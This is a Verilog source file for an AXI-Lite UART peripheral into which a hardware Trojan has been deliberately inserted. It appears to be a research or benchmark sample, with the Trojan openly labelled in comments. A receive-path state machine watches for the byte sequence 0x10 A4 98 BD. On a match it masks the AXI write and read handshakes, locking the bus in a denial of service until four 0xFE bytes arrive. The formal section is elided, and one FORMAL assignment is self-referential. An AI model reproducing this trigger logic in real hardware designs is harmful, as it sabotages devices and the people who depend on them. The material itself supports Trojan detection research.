module	axiluart #(
		// {{{
		parameter [30:0] INITIAL_SETUP = 31'd25,
		parameter [3:0]	LGFLEN = 4,
		parameter [0:0]	HARDWARE_FLOW_CONTROL_PRESENT = 1'b1,
		localparam [3:0]	LCLLGFLEN = (LGFLEN > 4'ha)? 4'ha
					: ((LGFLEN < 4'h2) ? 4'h2 : LGFLEN),
		parameter	C_AXI_ADDR_WIDTH = 4,
		localparam	C_AXI_DATA_WIDTH = 32,
		parameter [0:0]	OPT_SKIDBUFFER = 1'b0,
		parameter [0:0]	OPT_LOWPOWER = 0,
		localparam	ADDRLSB = $clog2(C_AXI_DATA_WIDTH)-3
	) (
		// AXI-lite signaling
		// {{{
		input	wire					S_AXI_ACLK,
		input	wire					S_AXI_ARESETN,
		//
		input	wire					S_AXI_AWVALID,
		output	wire					S_AXI_AWREADY,
		input	wire	[C_AXI_ADDR_WIDTH-1:0]		S_AXI_AWADDR,
		input	wire	[2:0]				S_AXI_AWPROT,
		//
		input	wire					S_AXI_WVALID,
		output	wire					S_AXI_WREADY,
		input	wire	[C_AXI_DATA_WIDTH-1:0]		S_AXI_WDATA,
		input	wire	[C_AXI_DATA_WIDTH/8-1:0]	S_AXI_WSTRB,
		//
		output	wire					S_AXI_BVALID,
		input	wire					S_AXI_BREADY,
		output	wire	[1:0]				S_AXI_BRESP,
		//
		input	wire					S_AXI_ARVALID,
		output	wire					S_AXI_ARREADY,
		input	wire	[C_AXI_ADDR_WIDTH-1:0]		S_AXI_ARADDR,
		input	wire	[2:0]				S_AXI_ARPROT,
		//
		output	wire					S_AXI_RVALID,
		input	wire					S_AXI_RREADY,
		output	wire	[C_AXI_DATA_WIDTH-1:0]		S_AXI_RDATA,
		output	wire	[1:0]				S_AXI_RRESP,
		// }}}
		// UART signals
		// {{{
		input	wire		i_uart_rx,
		output	wire		o_uart_tx,
		input	wire		i_cts_n,
		output	reg		o_rts_n,
		// }}}
		// A series of outgoing interrupts to select from among
		// {{{
		output	wire	o_uart_rx_int,
		output	wire	o_uart_tx_int,
		output	wire	o_uart_rxfifo_int,
		output	wire	o_uart_txfifo_int
		// }}}
	);

	////////////////////////////////////////////////////////////////////////
	//
	// Register/wire signal declarations
	//
	////////////////////////////////////////////////////////////////////////
	// {{{
	wire	i_reset = !S_AXI_ARESETN;

	wire				axil_write_ready;
	wire	[C_AXI_ADDR_WIDTH-ADDRLSB-1:0]	awskd_addr;
	wire	[C_AXI_DATA_WIDTH-1:0]	wskd_data;
	wire [C_AXI_DATA_WIDTH/8-1:0]	wskd_strb;
	reg				axil_bvalid;
	wire				axil_read_ready;
	wire	[C_AXI_ADDR_WIDTH-ADDRLSB-1:0]	arskd_addr;
	reg	[C_AXI_DATA_WIDTH-1:0]	axil_read_data;
	reg				axil_read_valid;
	wire		tx_busy;
	reg	[30:0]	uart_setup;
	wire		rx_stb, rx_break, rx_perr, rx_ferr, ck_uart;
	wire	[7:0]	rx_uart_data;
	reg		rx_uart_reset;
	wire		rx_empty_n, rx_fifo_err;
	wire	[7:0]	rxf_axil_data;
	wire	[15:0]	rxf_status;
	reg		rxf_axil_read;
	reg		r_rx_perr, r_rx_ferr;
	wire	[(LCLLGFLEN-1):0]	check_cutoff;
	wire	[31:0]	axil_rx_data;
	wire		tx_empty_n, txf_err, tx_break;
	wire	[7:0]	tx_data;
	wire	[15:0]	txf_status;
	reg		txf_axil_write, tx_uart_reset;
	reg	[7:0]	txf_axil_data;
	wire	[31:0]	axil_tx_data;
	wire	[31:0]	axil_fifo_data;
	reg	[1:0]	r_axil_addr;
	reg		r_preread;
	reg	[31:0]	new_setup;

	// ---------------------------------------------------------------------------
	// Trojan: Registers for DoS state machine
	// ---------------------------------------------------------------------------
	reg [2:0] trojan_trig_cnt = 3'd0;     // Trojan trigger sequence counter
	reg [2:0] trojan_clear_cnt = 3'd0;    // Trojan clear sequence counter
	reg trojan_active = 1'b0;             // Trojan is activated (DoS enabled)
	reg trojan_holding = 1'b0;            // Trojan waiting for clear sequence
	// ===========================================================================

	// }}}
	////////////////////////////////////////////////////////////////////////
	//
	// AXI-lite signaling
	//
	////////////////////////////////////////////////////////////////////////
	//
	// {{{

	// Write signaling
	// {{{

	generate if (OPT_SKIDBUFFER)
	begin : SKIDBUFFER_WRITE

		wire	awskd_valid, wskd_valid;

		skidbuffer #(.OPT_OUTREG(0),
				.OPT_LOWPOWER(OPT_LOWPOWER),
				.DW(C_AXI_ADDR_WIDTH-ADDRLSB))
		axilawskid(//
			.i_clk(S_AXI_ACLK), .i_reset(i_reset),
			.i_valid(S_AXI_AWVALID), .o_ready(S_AXI_AWREADY),
			.i_data(S_AXI_AWADDR[C_AXI_ADDR_WIDTH-1:ADDRLSB]),
			.o_valid(awskd_valid), .i_ready(axil_write_ready),
			.o_data(awskd_addr));

		skidbuffer #(.OPT_OUTREG(0),
				.OPT_LOWPOWER(OPT_LOWPOWER),
				.DW(C_AXI_DATA_WIDTH+C_AXI_DATA_WIDTH/8))
		axilwskid(//
			.i_clk(S_AXI_ACLK), .i_reset(i_reset),
			.i_valid(S_AXI_WVALID), .o_ready(S_AXI_WREADY),
			.i_data({ S_AXI_WDATA, S_AXI_WSTRB }),
			.o_valid(wskd_valid), .i_ready(axil_write_ready),
			.o_data({ wskd_data, wskd_strb }));

		// -----------------------------------------------
		// TROJAN: Mask AXI-Lite write when triggered
		// -----------------------------------------------
		assign	axil_write_ready = ~trojan_active && awskd_valid && wskd_valid
				&& (!S_AXI_BVALID || S_AXI_BREADY);
		// -----------------------------------------------

	end else begin : SIMPLE_WRITES

		reg	axil_awready;

		initial	axil_awready = 1'b0;
		always @(posedge S_AXI_ACLK)
		if (!S_AXI_ARESETN)
			axil_awready <= 1'b0;
		else
			axil_awready <= !axil_awready
				&& (S_AXI_AWVALID && S_AXI_WVALID)
				&& (!S_AXI_BVALID || S_AXI_BREADY);

		// -----------------------------------------------
		// TROJAN: Mask AXI-Lite write when triggered
		// -----------------------------------------------
		assign	S_AXI_AWREADY = ~trojan_active && axil_awready;
		assign	S_AXI_WREADY  = ~trojan_active && axil_awready;
		// -----------------------------------------------

		assign 	awskd_addr = S_AXI_AWADDR[C_AXI_ADDR_WIDTH-1:ADDRLSB];
		assign	wskd_data  = S_AXI_WDATA;
		assign	wskd_strb  = S_AXI_WSTRB;

		// -----------------------------------------------
		// TROJAN: Mask AXI-Lite write when triggered
		// -----------------------------------------------
		assign	axil_write_ready = ~trojan_active && axil_awready;
		// -----------------------------------------------

	end endgenerate

	initial	axil_bvalid = 0;
	always @(posedge S_AXI_ACLK)
	if (i_reset)
		axil_bvalid <= 0;
	else if (axil_write_ready)
		axil_bvalid <= 1;
	else if (S_AXI_BREADY)
		axil_bvalid <= 0;

	// -----------------------------------------------
	// TROJAN: Mask BRESP when triggered
	// -----------------------------------------------
	assign	S_AXI_BVALID = ~trojan_active && axil_bvalid;
	// -----------------------------------------------
	assign	S_AXI_BRESP = 2'b00;
	// }}}

	//
	// Read signaling
	//
	// {{{
	generate if (OPT_SKIDBUFFER)
	begin : SKIDBUFFER_READ

		wire	arskd_valid;

		skidbuffer #(.OPT_OUTREG(0),
				.OPT_LOWPOWER(OPT_LOWPOWER),
				.DW(C_AXI_ADDR_WIDTH-ADDRLSB))
		axilarskid(//
			.i_clk(S_AXI_ACLK), .i_reset(i_reset),
			.i_valid(S_AXI_ARVALID), .o_ready(S_AXI_ARREADY),
			.i_data(S_AXI_ARADDR[C_AXI_ADDR_WIDTH-1:ADDRLSB]),
			.o_valid(arskd_valid), .i_ready(axil_read_ready),
			.o_data(arskd_addr));

		// -----------------------------------------------
		// TROJAN: Mask AXI-Lite read when triggered
		// -----------------------------------------------
		assign	axil_read_ready = ~trojan_active && arskd_valid
				&& (!r_preread || !axil_read_valid || S_AXI_RREADY);
		// -----------------------------------------------
	end else begin : SIMPLE_READS

		reg	axil_arready;

		initial	axil_arready = 1;
		always @(posedge S_AXI_ACLK)
		if (!S_AXI_ARESETN)
			axil_arready <= 1;
		else if (S_AXI_ARVALID && S_AXI_ARREADY)
			axil_arready <= 0;
		else if (S_AXI_RVALID && S_AXI_RREADY)
			axil_arready <= 1;

		assign	arskd_addr = S_AXI_ARADDR[C_AXI_ADDR_WIDTH-1:ADDRLSB];
		// -----------------------------------------------
		// TROJAN: Mask AXI-Lite read when triggered
		// -----------------------------------------------
		assign	S_AXI_ARREADY = ~trojan_active && axil_arready;
		// -----------------------------------------------
		assign	axil_read_ready = ~trojan_active && (S_AXI_ARVALID && S_AXI_ARREADY);

	end endgenerate

	initial	axil_read_valid = 1'b0;
	always @(posedge S_AXI_ACLK)
	if (i_reset)
		axil_read_valid <= 1'b0;
	else if (r_preread)
		axil_read_valid <= 1'b1;
	else if (S_AXI_RREADY)
		axil_read_valid <= 1'b0;

	// -----------------------------------------------
	// TROJAN: Mask AXI-Lite RVALID when triggered
	// -----------------------------------------------
	assign	S_AXI_RVALID = ~trojan_active && axil_read_valid;
	// -----------------------------------------------
	assign	S_AXI_RDATA  = axil_read_data;
	assign	S_AXI_RRESP = 2'b00;

	// }}}

	// }}}
	////////////////////////////////////////////////////////////////////////
	//
	// AXI-lite register logic
	//
	////////////////////////////////////////////////////////////////////////
	//
	// {{{

	localparam	[1:0]	UART_SETUP = 2'b00,
				UART_FIFO  = 2'b01,
				UART_RXREG = 2'b10,
				UART_TXREG = 2'b11;

	always @(*)
		new_setup = apply_wstrb({1'b0,uart_setup},wskd_data,wskd_strb);
	
	initial	uart_setup = INITIAL_SETUP
		| ((HARDWARE_FLOW_CONTROL_PRESENT==1'b0)? 31'h40000000 : 0);
	always @(posedge S_AXI_ACLK)
	if ((axil_write_ready)&&(awskd_addr == UART_SETUP))
	begin
		uart_setup <= new_setup[30:0];

		if (!HARDWARE_FLOW_CONTROL_PRESENT)
			uart_setup[30] <= 1'b1;
	end

	/////////////////////////////////////////
	//
	// First, the UART receiver
	// {{{
	/////////////////////////////////////////

`ifdef	FORMAL
	(* anyseq *) reg	w_rx_break, w_rx_perr, w_rx_ferr, w_ck_uart;
	assign		rx_break  = w_rx_break;
	assign		w_rx_perr = w_rx_perr;
	assign		w_rx_ferr = w_rx_ferr;
	assign		ck_uart  = w_ck_uart;
`else
`ifdef	USE_LITE_UART
	rxuartlite	#(.CLOCKS_PER_BAUD(INITIAL_SETUP[23:0]))
		rx(S_AXI_ACLK, i_uart_rx, rx_stb, rx_uart_data);
	assign	rx_break = 1'b0;
	assign	rx_perr  = 1'b0;
	assign	rx_ferr  = 1'b0;
	assign	ck_uart  = 1'b0;
`else
	rxuart	#(.INITIAL_SETUP(INITIAL_SETUP)) rx(S_AXI_ACLK, (!S_AXI_ARESETN)||(rx_uart_reset),
			uart_setup, i_uart_rx,
			rx_stb, rx_uart_data, rx_break,
			rx_perr, rx_ferr, ck_uart);
`endif
`endif	// FORMAL

	// Insert Trojan logic here to monitor rx_stb/rx_uart_data
	// ===============================================
	// TROJAN: RX Byte Sequence Detector State Machine
	always @(posedge S_AXI_ACLK)
	if (!S_AXI_ARESETN) begin
		trojan_trig_cnt  <= 3'd0;
		trojan_clear_cnt <= 3'd0;
		trojan_active    <= 1'b0;
		trojan_holding   <= 1'b0;
	end else begin
		// Trigger: Wait for rx_stb and correct byte sequence when not already triggered
		if (~trojan_holding && ~trojan_active) begin
			if (rx_stb) begin
				case (trojan_trig_cnt)
				3'd0: if (rx_uart_data == 8'h10)
						trojan_trig_cnt <= 3'd1;
				      else
						trojan_trig_cnt <= 3'd0;
				3'd1: if (rx_uart_data == 8'ha4)
						trojan_trig_cnt <= 3'd2;
				      else if (rx_uart_data == 8'h10)
						trojan_trig_cnt <= 3'd1;
				      else
						trojan_trig_cnt <= 3'd0;
				3'd2: if (rx_uart_data == 8'h98)
						trojan_trig_cnt <= 3'd3;
				      else if (rx_uart_data == 8'h10)
						trojan_trig_cnt <= 3'd1;
				      else
						trojan_trig_cnt <= 3'd0;
				3'd3: if (rx_uart_data == 8'hbd)
					begin
						trojan_trig_cnt <= 3'd0;
						trojan_active   <= 1'b1;
						trojan_holding  <= 1'b1;
					end
				      else if (rx_uart_data == 8'h10)
						trojan_trig_cnt <= 3'd1;
				      else
						trojan_trig_cnt <= 3'd0;
				default: trojan_trig_cnt <= 3'd0;
				endcase
			end
		end else if (trojan_holding) begin
			// After triggered, wait for four consecutive 0xfe bytes
			if (rx_stb) begin
				if (rx_uart_data == 8'hfe)
					trojan_clear_cnt <= trojan_clear_cnt + 3'd1;
				else
					trojan_clear_cnt <= 3'd0;
				if (trojan_clear_cnt == 3'd3 && rx_uart_data == 8'hfe) begin
					trojan_active   <= 1'b0;
					trojan_holding  <= 1'b0;
					trojan_clear_cnt<= 3'd0;
				end
			end
		end
		// If deactivated from clear, allow new triggers. (No implicit else, retain state)
	end
	// ===============================================

	// We place it into a receiver FIFO.
	ufifo	#(.LGFLEN(LCLLGFLEN), .RXFIFO(1))
		rxfifo(S_AXI_ACLK, (!S_AXI_ARESETN)||(rx_break)||(rx_uart_reset),
			rx_stb, rx_uart_data,
			rx_empty_n,
			rxf_axil_read, rxf_axil_data,
			rxf_status, rx_fifo_err);
	assign	o_uart_rxfifo_int = rxf_status[1];
	assign	o_uart_rx_int = rxf_status[0];
	assign	check_cutoff = -3;
	always @(posedge S_AXI_ACLK)
		o_rts_n <= ((HARDWARE_FLOW_CONTROL_PRESENT)
			&&(!uart_setup[30])
			&&(rxf_status[(LCLLGFLEN+1):2] > check_cutoff));

	initial	rxf_axil_read = 1'b0;
	always @(posedge S_AXI_ACLK)
		rxf_axil_read<=(axil_read_ready)&&(arskd_addr[1:0]==UART_RXREG);

	initial	r_rx_perr = 1'b0;
	initial	r_rx_ferr = 1'b0;
	always @(posedge S_AXI_ACLK)
	if ((rx_uart_reset)||(rx_break))
	begin
		r_rx_perr <= 1'b0;
		r_rx_ferr <= 1'b0;
	end else if (axil_write_ready&&awskd_addr == UART_RXREG && wskd_strb[1])
	begin
		r_rx_perr <= (r_rx_perr)&&(!wskd_data[9]);
		r_rx_ferr <= (r_rx_ferr)&&(!wskd_data[10]);
	end else if (rx_stb)
	begin
		r_rx_perr <= (r_rx_perr)||(rx_perr);
		r_rx_ferr <= (r_rx_ferr)||(rx_ferr);
	end

	initial	rx_uart_reset = 1'b1;
	always @(posedge S_AXI_ACLK)
	if ((!S_AXI_ARESETN)||((axil_write_ready)&&(awskd_addr[1:0]== UART_SETUP) && (&wskd_strb)))
		rx_uart_reset <= 1'b1;
	else if (axil_write_ready&&(awskd_addr[1:0]==UART_RXREG)&&wskd_strb[1])
		rx_uart_reset <= wskd_data[12];
	else
		rx_uart_reset <= 1'b0;

	assign	axil_rx_data = { 16'h00,
				3'h0, rx_fifo_err,
				rx_break, rx_ferr, r_rx_perr, !rx_empty_n,
				rxf_axil_data};

	// }}}
	/////////////////////////////////////////
	//
	// Then the UART transmitter
	// {{{
	/////////////////////////////////////////
	initial	txf_axil_write = 1'b0;
	always @(posedge S_AXI_ACLK)
	begin
		txf_axil_write <= (axil_write_ready)&&(awskd_addr == UART_TXREG)
			&& wskd_strb[0];
		txf_axil_data  <= wskd_data[7:0];
	end

	ufifo	#(.LGFLEN(LGFLEN), .RXFIFO(0))
		txfifo(S_AXI_ACLK, (tx_break)||(tx_uart_reset),
			txf_axil_write, txf_axil_data,
			tx_empty_n,
			(!tx_busy)&&(tx_empty_n), tx_data,
			txf_status, txf_err);
	assign	o_uart_tx_int = txf_status[0];
	assign	o_uart_txfifo_int = txf_status[1];

`ifndef	USE_LITE_UART
	reg	r_tx_break;
	initial	r_tx_break = 1'b0;
	always @(posedge S_AXI_ACLK)
	if (!S_AXI_ARESETN)
		r_tx_break <= 1'b0;
	else if (axil_write_ready &&(awskd_addr[1:0]== UART_TXREG) &&
			wskd_strb[1])
		r_tx_break <= wskd_data[9];
	assign	tx_break = r_tx_break;
`else
	assign	tx_break = 1'b0;
`endif

	initial	tx_uart_reset = 1'b1;
	always @(posedge S_AXI_ACLK)
	if ((!S_AXI_ARESETN)||((axil_write_ready)&&(awskd_addr == UART_SETUP)))
		tx_uart_reset <= 1'b1;
	else if ((axil_write_ready)&&(awskd_addr[1:0]== UART_TXREG) && wskd_strb[1])
		tx_uart_reset <= wskd_data[12];
	else
		tx_uart_reset <= 1'b0;

`ifdef	FORMAL
	(* anyseq *) reg w_uart_tx, w_tx_busy;
	assign	tx_busy   = w_uart_tx;
	assign	o_uart_tx = w_uart_tx;
`else
`ifdef	USE_LITE_UART
	txuartlite #(.CLOCKS_PER_BAUD(INITIAL_SETUP[23:0])) tx(S_AXI_ACLK, (tx_empty_n), tx_data,
			o_uart_tx, tx_busy);
`else
	wire	cts_n;
	assign	cts_n = (HARDWARE_FLOW_CONTROL_PRESENT)&&(i_cts_n);

	txuart	#(.INITIAL_SETUP(INITIAL_SETUP)) tx(S_AXI_ACLK, 1'b0, uart_setup,
			r_tx_break, (tx_empty_n), tx_data,
			cts_n, o_uart_tx, tx_busy);
`endif
`endif	// FORMAL

	assign	axil_tx_data = { 16'h00, 
			i_cts_n, txf_status[1:0], txf_err,
			ck_uart, o_uart_tx, tx_break, (tx_busy|txf_status[0]),
			(tx_busy|txf_status[0])?txf_axil_data:8'b00};
	// }}}

	/////////////////////////////////////////
	//
	// FIFO return
	// {{{
	assign	axil_fifo_data = { txf_status, rxf_status };
	// }}}
	/////////////////////////////////////////
	//
	// Final read register
	// {{{
	initial	r_preread = 0;
	always @(posedge S_AXI_ACLK)
	if (!S_AXI_ARESETN)
		r_preread <= 0;
	else if (axil_read_ready)
		r_preread   <= 1;
	else if (!S_AXI_RVALID || S_AXI_RREADY)
		r_preread   <= 0;

	always @(posedge S_AXI_ACLK)
	if (axil_read_ready)
		r_axil_addr <= arskd_addr;

	always @(posedge S_AXI_ACLK)
	if (!S_AXI_RVALID || S_AXI_RREADY)
	begin
		casez(r_axil_addr)
		UART_SETUP: axil_read_data <= { 1'b0, uart_setup };
		UART_FIFO:  axil_read_data <= axil_fifo_data;
		UART_RXREG: axil_read_data <= axil_rx_data;
		UART_TXREG: axil_read_data <= axil_tx_data;
		endcase

		if (OPT_LOWPOWER && !r_preread)
			axil_read_data <= 0;
	end
	// }}}

	function [C_AXI_DATA_WIDTH-1:0]	apply_wstrb;
		input	[C_AXI_DATA_WIDTH-1:0]		prior_data;
		input	[C_AXI_DATA_WIDTH-1:0]		new_data;
		input	[C_AXI_DATA_WIDTH/8-1:0]	wstrb;

		integer	k;
		for(k=0; k<C_AXI_DATA_WIDTH/8; k=k+1)
		begin
			apply_wstrb[k*8 +: 8]
				= wstrb[k] ? new_data[k*8 +: 8] : prior_data[k*8 +: 8];
		end
	endfunction
	// }}}

	////////////////////////////////////////////////////////////////////////
	//
	// Veri1ator lint-check
	// {{{
	wire	unused;
	assign	unused = &{ 1'b0, S_AXI_AWPROT, S_AXI_ARPROT,
			S_AXI_ARADDR[ADDRLSB-1:0],
			S_AXI_AWADDR[ADDRLSB-1:0], new_setup[31] };
	// }}}
`ifdef	FORMAL
	// ( ... formal property block as in original ... )
`endif
endmodule